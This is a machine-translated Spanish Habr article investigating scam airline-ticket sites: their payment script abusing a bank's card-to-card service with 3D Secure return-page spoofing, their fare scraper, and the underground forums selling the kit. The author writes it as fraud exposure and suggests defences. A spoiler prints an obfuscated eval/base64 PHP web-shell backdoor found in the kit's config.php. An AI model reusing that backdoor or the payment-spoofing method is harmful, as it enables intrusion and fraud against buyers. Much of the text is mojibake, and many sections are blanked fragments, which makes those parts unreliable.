El script payp2p.php ya era un poco como su estado original. Yo mismo comenc√© a confundir lo que reemplac√© y lo que no. Por lo tanto, lo devolv√≠ a su forma original, excepto que en las √∫ltimas l√≠neas se deshabilit√≥ la redirecci√≥n de la redirecci√≥n a la p√°gina de pago exitosa. Los n√∫meros de tarjeta del remitente y el receptor para los intentos posteriores se utilizaron nuevos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Finalmente, con la ayuda de payp2p.php result√≥ hacer un pago exitoso. </font></font><br>
<br>
<img src="https://habrastorage.org/files/9cd/606/539/9cd60653958e4dda9fa38ef0e9826092.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Presta atenci√≥n a la firma en la l√≠nea "Descripci√≥n". </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Despu√©s de ingresar el c√≥digo de confirmaci√≥n 3D Secure, la devoluci√≥n se realiza a la p√°gina Promsvyazbak: </font></font><br>
<br>
<img src="https://habrastorage.org/files/fed/cb7/370/fedcb7370bcb4995a20a9a7218c6bdbc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
SMS recibidos. A la izquierda del banco del remitente. A la derecha del banco del beneficiario. </font></font><br>
<br>
<img src="https://habrastorage.org/files/463/935/875/46393587535a428384fc62522d5154ff.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sberbank, por alguna raz√≥n, indic√≥ en hora de SMS GMT. Anteriormente, no me di cuenta de esto en los mensajes de este banco.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Con la sustituci√≥n de la p√°gina de retorno deshabilitada, repita el pago exitoso usando el script payp2.php que apareci√≥ muchas veces. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Trat√© de pagar con otras tarjetas. Cada banco emite su formulario 3D Secure. Pero esto no cambia la esencia. </font></font><br>
<br>
<img src="https://habrastorage.org/files/452/684/b75/452684b75ede43deaca4c3c448d77bf5.png"><br>
<br>
<img src="https://habrastorage.org/files/671/19c/d9f/67119cd9f13b4b1b92c43903c4a5a466.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tenga en cuenta que no todos los bancos incluyen una "descripci√≥n adicional" en su formulario de confirmaci√≥n. En nuestro ejemplo, "pago de boleto".</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No es necesario adaptarse a la p√°gina de cada banco. Aunque las formas son diferentes, el mecanismo de sustituci√≥n de las mismas es el mismo. Cualquier formulario despu√©s del pago contiene un enlace con la direcci√≥n de la p√°gina a la que desea regresar. Los bancos mismos, que proporcionan formularios de verificaci√≥n 3D Secure, probablemente no ser√°n devueltos al "sitio izquierdo". Seguramente, hay algunas reglas y los bancos del formulario de verificaci√≥n 3DS deben al menos volver al mismo dominio desde el que se recibi√≥ la solicitud de pago. (En nuestro caso, en 3ds.payment.ru). El banco que verifica el c√≥digo 3D Secure, en caso de que la contrase√±a se ingrese correctamente, en el c√≥digo html de la p√°gina indica la direcci√≥n a la que es necesario regresar, pero ya no puede controlar si deb√≠a regresar a esta p√°gina.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como resultado de todos los experimentos, fue posible obtener el script payp2p.php para pagar a trav√©s del servicio de transferencia de tarjeta a tarjeta de Promsvyazbank 3ds.payment.ru. Al mismo tiempo, tuve que desactivar la sustituci√≥n de la direcci√≥n del remitente en las √∫ltimas l√≠neas del gui√≥n. Cuando activa la falsificaci√≥n de la direcci√≥n de la p√°gina de retorno, como estaba en el gui√≥n original, en este momento el dinero realmente no pasa. Se muestra la p√°gina de verificaci√≥n 3D Secure; Se env√≠a un SMS con "contrase√±a"; el formulario de verificaci√≥n no salta al siguiente paso al ingresar la contrase√±a incorrecta; despu√©s de ingresar la "contrase√±a" correcta, redirige a una p√°gina falsa, pero el dinero no pasa.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La falsificaci√≥n de la direcci√≥n de la p√°gina de devoluci√≥n para un pago exitoso es una parte muy importante para los sitios fraudulentos. Si el "comprador de boletos" no sospecha que fue enga√±ado, entonces puede pagar no uno, sino varias compras de boletos y despu√©s de eso durante mucho tiempo (d√≠as y semanas) no tomar ninguna acci√≥n activa para cancelar el pago, etc. Si el comprador despu√©s de "pagar los boletos a√©reos" recibe la confirmaci√≥n de la transferencia de una tarjeta a otra, lo m√°s probable es que ya no realice los siguientes pagos, se comunicar√° con su banco y, posiblemente, con la polic√≠a mucho m√°s r√°pido. Esto significa que los flujos de efectivo en sitios fraudulentos se reducen, la probabilidad de cancelar pagos anteriores aumenta, las agencias de aplicaci√≥n de la ley y los empleados anfitriones comienzan a actuar antes, y aumenta la probabilidad de no tener tiempo para retirar fondos robados a un lugar seguro.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El hecho de que este script se haya utilizado en un sitio de combate fraudulento, no tengo dudas. Tengo razones para creer que funcion√≥ en la forma en que me lo proporcionaron. Actualmente funciona de forma limitada (sin redireccionamientos).</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aproximadamente tres semanas despu√©s de la publicaci√≥n de la primera parte de la publicaci√≥n, que mencionaba a los estafadores que usaban el servicio de transferencia de tarjeta a tarjeta de Promsvyazbank, este banco realiz√≥ algunos cambios en su servicio, lo que considero importante. Anteriormente, al pagar a trav√©s del sitio web de Promsvyazbank, los pagadores recib√≠an SMS incomprensibles con el texto "P2P PSBANK", pero ahora comenzaron a recibir SMS con el texto "CARD2CARD PSBANK.RU". Aun as√≠, a primera vista, un ligero cambio en el descifrado del prop√≥sito del pago es suficiente para que algunas de las posibles v√≠ctimas de estafadores cancelen el pago en la etapa de confirmaci√≥n. Creo que esto no es una coincidencia, y los cambios se hicieron precisamente como resultado de la publicaci√≥n del art√≠culo sobre GeekTimes.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es probable que despu√©s de la publicaci√≥n de la primera parte del art√≠culo, junto con el cambio del texto de confirmaci√≥n en SMS, se puedan realizar ajustes adicionales a los algoritmos del servicio de transferencia de tarjeta a tarjeta de Promsvyazbank. </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">No puedo decir 100%, pero mi opini√≥n es que antes del servicio de Promsvyazbank 3ds.payment.ru con una alta probabilidad no verificaba el regreso de los usuarios a su sitio despu√©s de ingresar con √©xito el c√≥digo 3D Secure en los sitios de los bancos que emit√≠an tarjetas de cr√©dito. Por lo tanto, los pagos se realizaron incluso cuando los scripts fraudulentos cambiaron la p√°gina de devoluci√≥n.</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El banco, que se menciona muchas veces en esta publicaci√≥n, tuvo suerte con la publicidad gratuita. Creo que en realidad todav√≠a hay un n√∫mero suficiente de esos bancos. Es solo que es m√°s afortunado porque se eligi√≥ primero para usar en sitios fraudulentos, y luego para el an√°lisis en este art√≠culo. Como dicen, no hay pacientes sanos, hay pacientes mal examinados. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Al escribir este art√≠culo, la tarea de crear un gui√≥n de combate fraudulento no val√≠a la pena. La tarea consist√≠a en tratar de entender c√≥mo funciona o funciona para entender las razones por las cuales los "compradores de boletos a√©reos" podr√≠an ser enga√±ados, y sacar conclusiones de esto.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Este art√≠culo plantea muchas preguntas, pero no proporciona todas las respuestas. </font><font style="vertical-align: inherit;">Estoy seguro de que entre los lectores habr√° un n√∫mero suficiente de usuarios avanzados que podr√°n comentar con mayor precisi√≥n el cuadro cl√≠nico y hacer un diagn√≥stico. </font><font style="vertical-align: inherit;">Por mi parte, trat√© de presentar el testimonio lo m√°s completo posible ... </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se complet√≥ parte de la publicaci√≥n con el an√°lisis del gui√≥n de pago. </font><font style="vertical-align: inherit;">M√°s bonos para aquellos que pudieron leer en este lugar.</font></font><br>
<hr><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">¬øDe d√≥nde viene la tarifa a√©rea barata en sitios fraudulentos? </font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En la parte anterior de la publicaci√≥n, por signos indirectos, se demostr√≥ que la informaci√≥n sobre la disponibilidad de lugares y precios se obtiene mediante programaci√≥n en alg√∫n sitio honesto, modificada y emitida al usuario.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ejemplo de informaci√≥n sobre disponibilidad y precios en un sitio web fraudulento</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/7a5/1e4/8a8/7a51e48a8a3d4d8aabb8ea4acdbd053e.jpg"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora tenemos la oportunidad de mirar detr√°s de escena y ver c√≥mo se implementa esto en el c√≥digo del programa. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqu√≠ est√° el lugar en el c√≥digo del sitio fraudulento en el que vemos de d√≥nde provienen las im√°genes y los precios de los vuelos desde sitios fraudulentos. </font></font><br>
<br>
<img src="https://habrastorage.org/files/e65/0c5/25b/e650c525b0424acf861678766f7eb75c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como se esperaba en esta serie de sitios fraudulentos, la informaci√≥n sobre los lugares disponibles se toma en un sitio honesto </font></font><code>www.aviacassa.ru</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Dado que la cantidad de aerol√≠neas y vuelos es grande, es muy dif√≠cil descargar todas las im√°genes e √≠conos de antemano en un problema de este tipo, los enlaces a dichas im√°genes se dejan directamente al sitio original. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El descuento se deduce del precio original recibido por los boletos a√©reos. Como se mostr√≥ anteriormente, el propietario de un sitio fraudulento puede establecer arbitrariamente el monto del descuento. El monto del descuento se almacena en el archivo aviacfg.php.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Un c√≥digo m√°s completo responsable de obtener informaci√≥n sobre la disponibilidad de asientos, preparar enlaces a im√°genes y cambiar los precios bajo el spoiler.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Analizador de precios: una parte m√°s completa del c√≥digo</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/cf0/e74/617/cf0e7461727a4415bf018283c1cdf15c.png"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No desmontaremos esta pieza l√≠nea por l√≠nea, ya que no es el c√≥digo en s√≠ lo que importa, sino la idea de c√≥mo y de d√≥nde provienen los datos reales de los boletos de avi√≥n para sitios fraudulentos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El analizador anterior utilizaba otro sitio para obtener datos: </font></font><br>
<br>
<img src="https://habrastorage.org/files/e7e/625/9d8/e7e6259d8cc84a1586e61e7005ac6d3f.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sugerencia para la taquilla </font></font><code>(www.aviacassa.ru)</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: debe cerrar la posibilidad de enlaces a archivos de dominio desde un referente externo (sitio de referencia). </font><font style="vertical-align: inherit;">Esta oportunidad puede estar cerrada para todos sin excepci√≥n, o puede hacer excepciones solo para socios de confianza. </font><font style="vertical-align: inherit;">El servidor web NGINX, que usa aviacassa, lo hace f√°cil de hacer. </font><font style="vertical-align: inherit;">La misma recomendaci√≥n para todos los sitios similares que se pueden utilizar como "donantes de informaci√≥n".</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Si los sitios fraudulentos no pueden vincular directamente a im√°genes en sitios como las taquillas, esto complicar√° su vida. El n√∫mero de logotipos e im√°genes de varias aerol√≠neas no se conoce de antemano. Incluso si intenta descargar las im√°genes con anticipaci√≥n, puede omitir algo y el sitio fraudulento se ver√° feo. Dichos sitios se ver√°n obligados a descargar todas las im√°genes localmente en el servidor con cada solicitud, o al menos verificar si dicha imagen se descarg√≥ previamente al "cach√©" o no. Esto aumenta la carga en el servidor de la estafa y hace que el procesamiento de la p√°gina sea m√°s lento. Adem√°s, el cierre de la capacidad de vincular directamente a las im√°genes a la vez har√° que todos los sitios fraudulentos actuales que utilizan la informaci√≥n de la taquilla no funcionen.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por supuesto, con el tiempo, los desarrolladores har√°n parches. </font><font style="vertical-align: inherit;">Pero como los sitios fraudulentos no se administran de forma centralizada y varias personas no tienen actualizaciones autom√°ticas de software, cada propietario de un sitio fraudulento tendr√° que buscar una oportunidad para actualizarse. </font><font style="vertical-align: inherit;">Alguien encontrar√° el c√≥digo actualizado, pero alguien no lo encontrar√° y el sitio dejar√° de funcionar. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Adem√°s, la taquilla puede incluir un registro separado para tales im√°genes, en el que se guardar√°n los registros de todos los referentes externos (sitios de referencia). </font><font style="vertical-align: inherit;">Y en unos pocos d√≠as en este registro obtendr√° una lista de todos los sitios fraudulentos activos. </font><font style="vertical-align: inherit;">Es muy conveniente: en lugar de tratar de encontrar individualmente cada sitio, puede pedirles que se registren independientemente en la lista (archivo de registro).</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Y si hay administradores divertidos en la taquilla, puedes hacer una broma ...</font></font></b><div class="spoiler_text"> - NGINX           ,    ,  ¬´¬ª        ,         URL ,   .     .   ‚Äî   ¬´ ¬ª   ,        -, ,  ,       ,     .</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Alguien puede decir que la publicaci√≥n de dichos art√≠culos sirve como una herramienta de capacitaci√≥n para estafadores y hacer una pregunta, ¬øpor qu√© lo publiqu√© aqu√≠? Yo respondo Si hay alguna forma de robar dinero, basado en el uso de software vulnerable o insuficientemente protegido, sobre el cual al menos algunas personas saben y su objetivo es ganar dinero con √©l, entonces un intento de ocultar esa informaci√≥n y fingir que no hay problemas solo conduce a consecuencias a√∫n peores. Los estafadores usan estos m√©todos a√∫n m√°s activamente, mientras que los bancos est√°n contentos porque regularmente pagan la comisi√≥n por los servicios y les roban dinero. ¬øPor qu√© los bancos necesitan cambiar algo, si todo es tan bueno? De vez en cuando, solo algunos usuarios de Internet son enga√±ados y pierden dinero en sitios fraudulentos. ¬øPero a qui√©n le importa?</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mi opini√≥n es que si un gran n√∫mero de personas conoce alguna oportunidad "enga√±osa" para robar dinero, con el tiempo se volver√° mucho m√°s dif√≠cil para los estafadores usarlo, y ser√° imposible para las organizaciones que lo usan ignorar los problemas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
El script payp2.php y varios archivos utilizados en una serie reciente de sitios de ventas de aerol√≠neas fraudulentas me fueron enviados por el usuario </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" class="user_link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">frozenstorm</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . No s√© de d√≥nde lo sac√≥. Dirija todas las preguntas sobre este tema directamente a √©l.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pero puedo decir de inmediato que, como result√≥ m√°s tarde, no es dif√≠cil encontrar el conjunto completo de c√≥digos fuente para sitios fraudulentos que venden boletos de avi√≥n. </font><font style="vertical-align: inherit;">Busqu√© "vuelos falsos". </font><font style="vertical-align: inherit;">Ambos motores de b√∫squeda principales proporcionan enlaces en la primera p√°gina. </font><font style="vertical-align: inherit;">Un conjunto completo de c√≥digos fuente cuesta solo 25-30 toneladas de rublos. </font><font style="vertical-align: inherit;">Despu√©s de que este tema dej√≥ de funcionar, los c√≥digos fuente que no funcionan, que seg√∫n el vendedor son "f√°ciles de terminar", comenzaron a costar 10 tr. </font><font style="vertical-align: inherit;">Recientemente, a juzgar por los mensajes en los foros, la versi√≥n 2.0 supuestamente est√° a la venta nuevamente a un precio de 25 tr. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A continuaci√≥n se muestra un ejemplo de spoiler de venta gratuita del c√≥digo fuente de un sitio web fraudulento para la venta de boletos a√©reos en uno de los foros.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Captura de pantalla del foro. </font><font style="vertical-align: inherit;">(Im√°genes ordenadas, muy largas)</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/7bc/69f/693/7bc69f6935294a76ba54c22e6fc2376f.jpg"><br>
<div class="spoiler"><b class="spoiler_title"> .  (2/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/823/4a0/f64/8234a0f641be4ef1a1acfe4fe4c8c7b4.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (3/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/147/0d7/d85/1470d7d857c2462c9a8948a64348d13e.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (4/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/743/5ad/aef/7435adaef04748b987b38b5cac75590a.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (5/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/1a1/519/eb6/1a1519eb638949be87239514e44edec9.jpg"><br>
</div></div><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En el foro, que se muestra en la captura de pantalla, se venden y compran abiertamente c√≥digos de sitios web fraudulentos similares, informaci√≥n de tarjetas de cr√©dito, datos de pasaportes, informaci√≥n personal de bases de datos estatales, se propone hacer pasaportes falsos, licencias de conducir, etc. Esta es solo una lista corta, por ejemplo. Es decir con raras excepciones, hay un crimen continuo. Al mismo tiempo, la administraci√≥n del foro act√∫a como garante entre compradores y vendedores. Hay varios foros como este. Todos trabajan libremente por a√±os. Todos ellos est√°n perfectamente indexados por los motores de b√∫squeda (Yandex, Google, etc.). No cito la direcci√≥n de un foro espec√≠fico. Son muy f√°ciles de encontrar.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dado que detr√°s de cada sitio web fraudulento para la venta de boletos a√©reos hay una persona separada que compr√≥ el c√≥digo fuente del sitio web a bajo costo, en cada caso puede encontrar a la persona responsable y esto debe hacerse. No todos los administradores de un sitio tan falso son un s√∫per profesional cuyos rastros no se pueden encontrar. Estoy seguro de que entre esos administradores hay suficientes que han heredado y, si tienen la autoridad adecuada, se pueden calcular. Pero, en mi opini√≥n, en lugar de tratar de tratar cada sitio falso individualmente, debe prestar atenci√≥n a los sitios donde las fuentes de dichos sitios falsos se distribuyen libremente.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para infligir un golpe aplastante en sitios fraudulentos que venden boletos de avi√≥n falsos, no necesita tanto. Si todos hacen un poco, esto complicar√° enormemente la vida de los estafadores y puede plantear la cuesti√≥n de la ineficiencia de llevar a cabo un negocio de este tipo. Se requiere un poco de atenci√≥n por parte de los motores de b√∫squeda para evitar que dichos sitios entren en anuncios. No es realista dividir dichos sitios en los mejores resultados sin publicidad. Adem√°s, los motores de b√∫squeda deben excluir los sitios que realmente compran y venden esquemas criminales. Se requiere un poco de atenci√≥n de los bancos para realizar un seguimiento de sus servicios de pago para que los estafadores no puedan usarlos f√°cilmente. Necesito un poco de atenci√≥n de los anfitriones. Necesita un poco de atenci√≥n por parte de los sistemas de pago: para empezar, no permita pagos sin verificar 3D Secure (como se muestra en la primera parte de la publicaci√≥n,todav√≠a es posible). Necesita un poco de atenci√≥n de la polic√≠a. En lugar de investigar cada caso de robo de dinero, es m√°s eficiente actuar de antemano: lidiar con el nido donde se comunican los estafadores (analice, por ejemplo, esos foros muy ocultos). Y, por supuesto, necesita un poco de atenci√≥n por parte de los potenciales compradores de boletos de avi√≥n.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dicen que las reparaciones no se pueden completar, y solo se puede detener. </font><font style="vertical-align: inherit;">Esta publicaci√≥n es un caso similar. </font><font style="vertical-align: inherit;">Por lo tanto, aunque se podr√≠a escribir mucho m√°s, me detendr√© aqu√≠. </font><font style="vertical-align: inherit;">Gracias por su atencion </font><font style="vertical-align: inherit;">Estar√© encantado de tus comentarios.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PD Sobre Jackie Chan ... No puedes leer</font></font></b><div class="spoiler_text">      ,       ,           ,    ,      .<br>
<br>
          ,       , ,   ,     - .      .        .<br>
<br>
<div class="spoiler"><b class="spoiler_title"> </b><div class="spoiler_text">   fon.png.    ,   ,  .    (merch)    .    .<br>
<br>
           . , -      ,    .    .        .<br>
<img src="https://habrastorage.org/files/d79/ff7/9c4/d79ff79c458d4bd9ad5c15987f410a8b.png"><br>
<br>
         VISA  Mastercard     (logo_standart_ru.png):<br>
<br>
<img src="https://habrastorage.org/files/596/f44/183/596f4418373846908dcede64835821c4.png"><br>
<br>
    .   , .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">       parser.php</b><div class="spoiler_text"><img src="https://habrastorage.org/files/0a9/dd4/b36/0a9dd4b36e6b45ed9aa6f5584dc2adec.png"><br>
<br>
     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">  </b><div class="spoiler_text">    ,   ,   ,    - . ,    -,      ¬´¬ª .  (config.php)     ,  .                .     .     .          .<br>
<br>
<img src="https://habrastorage.org/files/65d/4e6/484/65d4e6484eca40468fdab34568130804.png"><br>
<br>
<pre><code class="php hljs"><span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>,<font></font>
<font></font>
<span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>,
</code></pre></div></div><br>
<div class="spoiler"><b class="spoiler_title"> .       </b><div class="spoiler_text"><img src="https://habrastorage.org/files/d28/976/6b8/d289766b88b640119c267f7721f8be25.png"><br>
<br>
     ,      ,  ,  ¬´¬ª      .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">     email  </b><div class="spoiler_text">     ,  EMAIL.  :<br>
<br>
<img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"> <br>
       3ds.payment.ru       <code>Lakhtin@psbank.ru</code>.<br>
<br>
 ,      ? ,    - . , ,     Mastercard     3DS.<br>
<br>
<code>https://www.mastercard.us/content/dam/mccom/en-us/documents/SecureCode%20Vendor%20list/3ds-vendor-list-042215.pdf</code><br>
<br>
<div class="spoiler"><b class="spoiler_title">         Mastercard</b><div class="spoiler_text"><img src="https://habrastorage.org/files/568/5a5/70f/5685a570faf943c191ab61e9927b5e17.png"><br>
</div></div><br>
 email            .      -      .      -         . ..  - ,      ,     ,      - .<br>
<br>
  ,   email      ?     . ,  -,        .          ,     .            .     ,           ,   -   -   ,     ,      .<br>
<br>
          . , - -   email    .  ,   ,              .   ,       .   ,    ,        ,           .       -  , ,   ,  email  -,    -           . (,       ,    ..     ).      ,     .. .     .  ,          -,      .  ,       ,      ,      ,    .          .     ,     -, ,           .         , ,   ,     ,     . <br>
<br>
       ?         ,     .  email  , , .     .   -  ,     -   ,        .</div></div><br>
<div class="spoiler"><b class="spoiler_title">   ?</b><div class="spoiler_text">    ,     , ¬´¬ª   3ds.payment.ru,    .    ,          LaravelRUS    ,      Curl   3ds.payment.ru. <br>
<br>
     ,      .       ?   ?  ?<br>
 ,          ,     .<br>
<br>
<img src="https://habrastorage.org/files/51b/341/bd4/51b341bd4e9143a3b9c41fbf5288e33e.png"><br>
<br>
<img src="https://habrastorage.org/files/aac/503/90c/aac50390ca644df2a8ce9de00bc2425a.png"><br>
<br>
<img src="https://habrastorage.org/files/5e0/1f8/d30/5e01f8d302c14d229d64f7b0b52a2112.png"><br>
<br>
      .   . -    .<br>
<br>
<img src="https://habrastorage.org/files/8ee/d73/b76/8eed73b765f94a1ba8de070278a3d8df.png"><br>
<br>
 :<br>
<br>
¬ª <code>https://gitter.im/LaravelRUS/chat/archives/2016/05/06</code> ‚Äî      .       .<br>
¬ª <code>http://gitchat.org/developers/Valtas</code> ‚Äî     <br>
¬ª <code>https://github.com/Valtas</code> ‚Äî    Github<br>
¬ª <code>https://www.fl.ru/tu/57770/parser-internet-magazina.html -   .</code><br>
<br>
       ,  ,     ‚Äî      .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">      </b><div class="spoiler_text">  ,        .       ,      .          ,   .<br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">http://forum.prootzyvy.org/forums/spisok-sajtov-moshennikov-po-prodazhe-aviabiletov.134/</a><br>
<br>
    336 .           ,     .      .<br>
<br>
<div class="spoiler"><b class="spoiler_title">        </b><div class="spoiler_text"><img src="https://habrastorage.org/files/ca0/31e/669/ca031e669c344a2fad4af30380977d80.png"><br>
</div></div><br>
        ?   ,     .   .    ,   .                  ,  ,  ,    ..      ,    .        ,   ,     .   ,     -   ¬´ ¬ª         .     (     ).     - 5-10-20     ..   ,   ,        ,    .    (),  ,    ,     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">.     ?</b><div class="spoiler_text">               .        .           ,     .      ,      .          ¬´.  ¬ª.    ,                 .      ,            .               .   .         .<br>
<br>
       ,        ,   . ,   ,      -,        .    ,     .    ,   ,          . <br>
<br>
       ,     .    ,       . ,              .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> </b><div class="spoiler_text">         ,             ,           .     -   -     .       .       ,    .<br>
<br>
<img src="https://habrastorage.org/files/cfb/9df/65c/cfb9df65c6d34e2ea70ee2d078901119.png"><br>
<br>
  80   ,          .    ,    .        ,  .     :<br>
<br>
<img src="https://habrastorage.org/files/7f7/05b/2eb/7f705b2ebb5d4b5bb19bc37eeb6e7c16.png"><br>
<br>
     56      , ¬´ ¬ª,     ,    . <br>
     ,   ,  ¬´ ¬ª,     ,     .<br>
<br>
       :<br>
<br>
<img src="https://habrastorage.org/files/6f8/ef9/849/6f8ef98493bc40c1949431241c59d0a0.png"><br>
<br>
<img src="https://habrastorage.org/files/52f/15a/2ea/52f15a2eaf94401baf1a7995169b2470.png"><br>
<br>
     -  -.          ,     .   ,          .     .  ,     .    ,          ,   ,  . <br>
</div></div><br>
</div></div></div>
      
    </div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es398313/">https://habr.com/ru/post/es398313/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es398301/index.html">Hogar inteligente o juguete para hombres: control de temperatura</a></li>
<li><a href="../es398303/index.html">Ideapad septuag√©sima: revisi√≥n de la serie Y de port√°tiles para juegos</a></li>
<li><a href="../es398305/index.html">Se completa la traducci√≥n del segundo libro de la serie "Memoria del pasado de la Tierra", "Bosque oscuro". Disfruta leyendo</a></li>
<li><a href="../es398309/index.html">Problemas de la rob√≥tica moderna 2, o c√≥mo los juegos salvar√°n el mundo ...</a></li>
<li><a href="../es398311/index.html">Tent√°culos mec√°nicos manuales en el hogar: parte 2, gesti√≥n de cables</a></li>
<li><a href="../es398315/index.html">¬øC√≥mo perciben los fotones el tiempo?</a></li>
<li><a href="../es398317/index.html">¬´–î–æ–º-—Å-–£–º–æ–º¬ª –∏–ª–∏ –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è –ø—Ä—è–º–æ –∏–∑ –∫–æ—Ä–æ–±–∫–∏</a></li>
<li><a href="../es398319/index.html">Bart Knolls: un asesino de mosquitos intransigente</a></li>
<li><a href="../es398321/index.html">Killing Kindred: una estrategia evolutiva anticuada</a></li>
<li><a href="../es398323/index.html">Los actores de videojuegos se preparan para hacer huelga para los desarrolladores</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
